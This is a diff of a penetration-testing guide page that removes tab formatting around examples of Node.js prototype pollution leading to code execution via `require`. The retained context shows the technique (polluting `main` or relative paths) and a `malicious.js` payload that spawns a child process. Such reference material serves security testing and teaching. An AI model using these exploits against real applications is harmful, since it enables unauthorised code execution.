@@ -551,9 +551,6 @@ Therefore, if a require is executed after your prototype pollution and no spawn 
 
 If the performed require is **absolute** (`require("bytes")`) and the **package doesn't contain main** in the `package.json` file, you can **pollute the `main` attribute** and make the **require execute a different file**.
 
-{{#tabs}}
-{{#tab name="exploit"}}
-
 ```javascript
 // Create a file called malicious.js in /tmp
 // Contents of malicious.js in the other tab
@@ -581,27 +578,17 @@ var proc = require("bytes");
 // This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
 ```
 
-{{#endtab}}
-
-{{#tab name="malicious.js"}}
-
 ```javascript
 const { fork } = require("child_process");
 console.log("Hellooo from malicious");
 fork("anything");
 ```
 
-{{#endtab}}
-{{#endtabs}}
-
 <br>
 
 ### Relative require - 1
 
 If a **relative path** is loaded instead of an absolute path, you can make node **load a different path**:
-
-{{#tabs}}
-{{#tab name="exploit"}}
 
 ```javascript
 // Create a file called malicious.js in /tmp
@@ -628,25 +615,15 @@ var proc = require("./relative_path.js");
 // This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
 ```
 
-{{#endtab}}
-
-{{#tab name="malicious.js"}}
-
 ```javascript
 const { fork } = require("child_process");
 console.log("Hellooo from malicious");
 fork("/path/to/anything");
 ```
 
-{{#endtab}}
-{{#endtabs}}
-
 <br>
 
 ### Relative require - 2
-
-{{#tabs}}
-{{#tab name="exploit"}}
 
 ```javascript
 // Create a file called malicious.js in /tmp
@@ -675,18 +652,11 @@ var proc = require("./relative_path.js");
 // This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
 ```
 
-{{#endtab}}
-
-{{#tab name="malicious.js"}}
-
 ```javascript
 const { fork } = require("child_process");
 console.log("Hellooo from malicious");
 fork("/path/to/anything");
 ```
-
-{{#endtab}}
-{{#endtabs}}
 
 <br>
 
